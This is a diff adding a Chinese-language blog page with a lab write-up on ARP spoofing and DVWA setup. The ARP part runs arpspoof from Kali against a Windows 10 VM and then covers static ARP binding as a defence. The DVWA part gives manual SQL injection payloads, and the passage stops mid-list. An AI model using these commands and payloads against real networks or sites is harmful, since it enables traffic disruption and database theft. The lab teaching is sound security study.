@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="[toc] 渗透 and web渗透ARP攻防ARP欺骗ARP即地址解析协议，在知道目标主机IP地址的情况下，如果需要得到目标知道的MAC地址，ARP协议即可以达到。如果该协议被恶意地对网络进行攻击，其后果是非常严重的。 ARP通常包括两个协议包，一个ARP请求包与一个ARP回应包，请求包如图2.37所示，ARP请求包是一个广播包，在ARP请求包中，源主机发出“Who has 192.168.1.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透 and web">
+<meta property="og:url" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/index.html">
+<meta property="og:site_name" content="orangeの博客">
+<meta property="og:description" content="[toc] 渗透 and web渗透ARP攻防ARP欺骗ARP即地址解析协议，在知道目标主机IP地址的情况下，如果需要得到目标知道的MAC地址，ARP协议即可以达到。如果该协议被恶意地对网络进行攻击，其后果是非常严重的。 ARP通常包括两个协议包，一个ARP请求包与一个ARP回应包，请求包如图2.37所示，ARP请求包是一个广播包，在ARP请求包中，源主机发出“Who has 192.168.1.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/1.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/2.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/3.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/4.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/5.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/6.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/7.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/8.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/9.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/10.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/11.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/12.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/13.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/14.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/15.png">
+<meta property="og:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/16.png">
+<meta property="article:published_time" content="2022-07-19T13:17:43.000Z">
+<meta property="article:modified_time" content="2022-07-19T13:35:45.845Z">
+<meta property="article:author" content="涩橙子">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/1.png">
+
+
+<link rel="canonical" href="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/","path":"2022/07/19/渗透-and-web/","title":"渗透 and web"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>渗透 and web | orangeの博客</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">orangeの博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F-and-web"><span class="nav-number">1.</span> <span class="nav-text">渗透 and web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.1.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP%E6%94%BB%E9%98%B2"><span class="nav-number">1.1.1.</span> <span class="nav-text">ARP攻防</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ARP%E6%AC%BA%E9%AA%97"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">ARP欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ARP%E6%AC%BA%E9%AA%97%E5%B7%A5%E5%85%B7"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">ARP欺骗工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E8%8C%83ARP%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">防范ARP攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80-%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AE%8C%E6%88%90%E9%98%B2%E5%BE%A1"><span class="nav-number">1.1.1.3.1.</span> <span class="nav-text">一.用命令完成防御</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BA%8C-%E4%BD%BF%E7%94%A8%E8%BD%AF%E4%BB%B6%E8%BF%9B%E8%A1%8C%E9%98%B2%E6%8A%A4"><span class="nav-number">1.1.1.3.2.</span> <span class="nav-text">二.使用软件进行防护</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-DVWA"><span class="nav-number">1.2.1.</span> <span class="nav-text">一.DVWA</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">安装过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85phpstudy"><span class="nav-number">1.2.1.1.1.</span> <span class="nav-text">安装phpstudy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDDVWA%E6%BA%90%E7%A0%81"><span class="nav-number">1.2.1.1.2.</span> <span class="nav-text">下载DVWA源码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E9%9C%80%E8%A6%81%E7%9A%84%E4%BE%9D%E8%B5%96%E5%BA%93"><span class="nav-number">1.2.1.1.3.</span> <span class="nav-text">安装需要的依赖库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C"><span class="nav-number">1.2.1.1.4.</span> <span class="nav-text">运行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">SQL注入(手工注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#low%E7%BA%A7"><span class="nav-number">1.2.1.2.1.</span> <span class="nav-text">low级</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Medium%E7%BA%A7"><span class="nav-number">1.2.1.2.2.</span> <span class="nav-text">Medium级</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">涩橙子</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/19/%E6%B8%97%E9%80%8F-and-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="涩橙子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="orangeの博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="渗透 and web | orangeの博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透 and web
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-07-19 21:17:43 / Modified: 21:35:45" itemprop="dateCreated datePublished" datetime="2022-07-19T21:17:43+08:00">2022-07-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>[toc]</p>
+<h1 id="渗透-and-web"><a href="#渗透-and-web" class="headerlink" title="渗透 and web"></a>渗透 and web</h1><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="ARP攻防"><a href="#ARP攻防" class="headerlink" title="ARP攻防"></a>ARP攻防</h3><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p><strong>ARP即地址解析协议，在知道目标主机IP地址的情况下，如果需要得到目标知道的MAC地址，ARP协议即可以达到。如果该协议被恶意地对网络进行攻击，其后果是非常严重的。</strong></p>
+<p><strong>ARP通常包括两个协议包，一个ARP请求包与一个ARP回应包，请求包如图2.37所示，ARP请求包是一个广播包，在ARP请求包中，源主机发出“Who has 192.168.1.2? Tell 192.168.1.128”。</strong></p>
+<p><strong>如图：</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/1.png" alt="1"></p>
+<p><strong>在ARP应答包中，源主机接收到目标主机发过来的应答包，“192.168.1.2 is at 00:50:56:ef:93:1d”，非常明了，也就是PC机192.168.1.2的MAC地址为00:50:6:ef:93:1d。常见的ARP欺骗有网关欺骗与主机骗两种：</strong></p>
+<ul>
+<li><p><strong>一种是对路由器ARP表的欺骗</strong></p>
+<p><strong>ARP欺骗的原理是截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。</strong></p>
+</li>
+<li><p><strong>第二种是对内网PC的网关欺骗</strong></p>
+<p><strong>第二种ARP欺骗的原理是伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，网络掉线了。</strong></p>
+</li>
+</ul>
+<h4 id="ARP欺骗工具"><a href="#ARP欺骗工具" class="headerlink" title="ARP欺骗工具"></a>ARP欺骗工具</h4><p><strong>arpspoof是一款ARP欺骗工具，下面通过实验演示ARP欺骗，实验环境为攻击者为kali系统，IP地址为192.168.1.129，靶机为Windows 10，其IP地址为192.168.1.128，具体操作过程如下所示：</strong></p>
+<p><strong>在kali系统中安装dsniff 嗅探工具：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install dsniff </span><br></pre></td></tr></table></figure>
+
+<p><strong>安装完成之后我们可以使用<code>arpspoof</code>命令来攻击靶机(192.168.1.128)</strong></p>
+<p><strong>然后我们在<code>VMware  Workstation</code>里面的【菜单栏】里面点击【编辑】向下找到【虚拟网络编辑器】，进到里面调配网络段使两台电脑在同一个局域网内。</strong></p>
+<p><strong>进入【虚拟网络编辑器】之后点击【VMnet8】然后点击右下角的【更改设置】获取管理员权限，然后把左下角的子网ip更改为【192.168.1.0】，然后点击【确定】，然后两台设备(攻击者kali主机和靶机都在同一个局域网内了)</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/2.png" alt="2"></p>
+<p><strong>在win10主机里面：</strong></p>
+<p><strong>我们在控制面版里面找到【window Defender 防火墙】，点击进去后在左边找到【启用或者关闭 window Defender 防火墙】，把win10的防火墙全部关闭，便以我们接下来的实验。</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/3.png" alt="3"></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/4.png" alt="4"></p>
+<p><strong>我们首先打开攻击者kali系统，对局域网内的网段进行一次全局扫描来获取靶机的目标ip</strong></p>
+<p><strong>打开kali后，右击桌面点击【Open Terminal Here】打开命令窗口。</strong></p>
+<p><strong>在命令窗口输入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/5.png" alt="5"></p>
+<p><strong>(kali㉿kali)-[~/Desktop]</strong><br><strong>└─$ nmap -sP 192.168.1.0/24<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-11-03 05:25 EDT</strong><br><strong>Nmap scan report for 192.168.1.2       # 这个是网关ip</strong><br><strong>Host is up (0.00059s latency).</strong><br><strong>Nmap scan report for 192.168.1.128  # 这个是靶机ip</strong><br><strong>Host is up (0.0036s latency).</strong><br><strong>Nmap scan report for 192.168.1.129  # 这个是kali的ip</strong><br><strong>Host is up (0.0020s latency).</strong><br><strong>Nmap done: 256 IP addresses (3 hosts up) scanned in 2.77 seconds</strong></p>
+<p><strong>然后获取我们局域网内的地址</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure>
+
+<p><strong>kali㉿kali)-[~/Desktop]</strong><br><strong>└─$ route</strong><br><strong>Kernel IP routing table</strong><br><strong>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</strong><br><strong>default         192.168.1.2     0.0.0.0         UG    100    0        0 eth0</strong><br><strong>192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0</strong></p>
+<p><strong>通过上下对比，可以确定网关IP是192.168.1.2，靶机ip是192.168.1.128，那么前期的信息采集完成，我们接下来对目标靶机进行arp攻击。</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t 目标ip 主机ip(路由器)      <span class="comment">#-i是指定网卡攻击，可以用ifconfig命令查看网卡 </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>这里我们使用这个命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t 192.168.1.128 192.168.1.2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/6.png" alt="6"></p>
+<p><strong>这个时侯的win10还能愉快的上网</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/7.png" alt="7"></p>
+<p><strong>但是攻击命令按下去后，想打开网页都成为一种奢望</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/8.png" alt="8"></p>
+<p><strong>取消kali的arp攻击(ctrl + c)后，win10的网络恢复正常</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/9.png" alt="9"></p>
+<p><strong>我们来对比一下没被攻击前的win10的arp表和被攻击后的arp表的变化</strong></p>
+<ul>
+<li><strong>没被攻击前</strong></li>
+</ul>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/10.png" alt="10"></p>
+<ul>
+<li><strong>被攻击后</strong></li>
+</ul>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/11.png" alt="11"></p>
+<p><strong>没攻击前的路由mac地址是【00-50-56-ef-93-1d】，被攻击后路由mac地址变成了【00-0c-29-c7-25-1a】</strong></p>
+<p><strong>并且，还有一个特别有趣的地方就是【192.168.1.129】的mac地址和网关路由的mac地址完全一致，那么我们可以推断出上面那条攻击命令是把攻击者kali的mac替换了网关路由的mac</strong></p>
+<h4 id="防范ARP攻击"><a href="#防范ARP攻击" class="headerlink" title="防范ARP攻击"></a>防范ARP攻击</h4><p><strong>虽然上面的攻击手段能达到断网、欺骗等效果，但是arp攻击已经是几十年的手段了，它有着种种局限性，例如：ARP攻击仅能在以太网进行，无法对外网进行攻击。</strong></p>
+<h5 id="一-用命令完成防御"><a href="#一-用命令完成防御" class="headerlink" title="一.用命令完成防御"></a>一.用命令完成防御</h5><p><strong>原理：在上面我们知道arp工作原理是不断发送欺骗信息来对我们的arp变进行修改，那么我们可以使用手动配置的arp静态表来防止别人的arp欺骗攻击。（但是，静态配置的对不同的环境有着不好的兼容性，也就是说换一个地方工作，我们又要重新配一次静态arp，这样就会很麻烦，第二种办法则很好的解决这种问题，而且对新人非常友好。）</strong></p>
+<p><strong>1、Win10以管理员身份运行<code>cmd</code>命令提示符</strong><br><strong>我们可以在Windows10系统的开始菜单上，单击鼠标右键，这时候出现的菜单中，我们选择命令提示符（管理员）点击打开这样即可。</strong><br><strong>2、首先，我们查询本地连接的网卡ID号</strong></p>
+<p><strong>运行命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh i i show <span class="keyword">in</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>如下图所示：</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/12.png" alt="12"></p>
+<p><strong>从上图可以知道，“Internet”的网卡ID为15，注意是我们需要的是<code>Idx</code>一栏而不是<code>Met</code>。</strong></p>
+<p><strong>接下来用命令：arp -a来获取网关路由的ip地址和mac地址</strong></p>
+<p><strong>3、绑定</strong><br><strong>在DOS界面运行命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -c i i add neighbors 15 192.168.1.2 00-50-56-ef-93-1d       （这里的15就是查询到的本地网卡的ID）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/13.png" alt="13"></p>
+<p><strong>然后运行命令：arp -a查询是否绑定成功</strong></p>
+<p><strong>绑定成功的标志就是右边的【动态】变成了【静态】</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/14.png" alt="14"></p>
+<p><strong>4、单次解绑</strong><br><strong>之前通过arp–s方式手动绑定了网关MAC地址，通过arp–d清除该绑定即可。</strong><br><strong>arp -d 192.168.1.2</strong></p>
+<p><strong>5、永久解绑</strong><br><strong>如过想解除绑定在CMD命令行程序里输入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh i i reset </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/15.png" alt="15"></p>
+<p><strong>不过需要重启才能生效。重启后本地IP地址、网关也要重新设置。</strong></p>
+<h5 id="二-使用软件进行防护"><a href="#二-使用软件进行防护" class="headerlink" title="二.使用软件进行防护"></a>二.使用软件进行防护</h5><p><strong>国产软件360安全卫士里面有个实用的功能大全，里面的360流量防火墙可以对您局域网内的设备进行防护，刚入门的小白还是建议使用软件辅助学习会更加事半功倍。</strong></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/16.png" alt="16"></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="一-DVWA"><a href="#一-DVWA" class="headerlink" title="一.DVWA"></a>一.DVWA</h3><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><h5 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h5><h5 id="下载DVWA源码"><a href="#下载DVWA源码" class="headerlink" title="下载DVWA源码"></a>下载DVWA源码</h5><h5 id="安装需要的依赖库"><a href="#安装需要的依赖库" class="headerlink" title="安装需要的依赖库"></a>安装需要的依赖库</h5><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p>1.这里把<code>DVWA</code>源码解压到<code>phpstudy</code>的<code>WWW</code>目录中，然后修改DVWA的配置文件目录config里面的<code>config.inc.php.dist</code>,将其重命名为<code>config.inc.php</code>。</p>
+<p>2.编辑<code>config.inc.php</code>文件 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># phpstudy的默认用户和密码都是root，所以只需要修改这个即可。</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;root&#x27;</span>;       </span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>修改完成之后，重启phpstudy，然后登陆浏览器<code>localhost/DVWA目录名字</code>即可看到网站，然后点击里面的<code>Create/Reset Datebase</code>即可完成。</p>
+<p>登录DVWA，默认用户是<code>admin</code>，密码是<code>password</code></p>
+<p>这里有个地方需要小小滴小改一下，那就是<code>难度</code></p>
+<p>登录进去之后找到<code>DVWA Security</code>里面有四个难度，从低到高分别是low、Medium、High、Impossible</p>
+<h4 id="SQL注入-手工注入"><a href="#SQL注入-手工注入" class="headerlink" title="SQL注入(手工注入)"></a>SQL注入(手工注入)</h4><h5 id="low级"><a href="#low级" class="headerlink" title="low级"></a>low级</h5><p>首先，判断字符型注入还是数字型注入</p>
+<p>1.一般可以通过直接输入单引号来判断是否存在注入点</p>
+<p>2.也可以通过输入3和1+2判断注入为字符型注入，若为数字型注入，则3和1+2输出一样</p>
+<p>那么我们先输入一个3得到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 3</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br></pre></td></tr></table></figure>
+
+<p>然后输入2+1得到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 2+1</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br></pre></td></tr></table></figure>
+
+<p>可以判断出这是字符型注入</p>
+<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码</p>
+<blockquote>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘$id’</p>
+</blockquote>
+<ul>
+<li><p>‘ or 1=1 or ‘ </p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘ ‘ or 1=1 or ‘ ‘ </p>
+<p>False or True or False</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Bob</span><br><span class="line">Surname: Smith</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>1’ or ‘1’ =’1 </p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or ‘1’ =’1’ </p>
+<p>True or True</p>
+</li>
+<li><p>‘or 1=1 # </p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘’or 1=1 #’</p>
+<p># 为注释</p>
+<p>False or True</p>
+</li>
+<li><p>‘or 1=1 –  SELECT first_name, last_name FROM users WHERE user_id = ‘’or 1=1 – ‘ </p>
+<p>– （有空格）也是注释 </p>
+<p>False or True</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>3.猜SQL查询语句的字段数</p>
+<ul>
+<li>1’ order by 2 #</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; order by 2 #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>1’ order by 3 #</li>
+</ul>
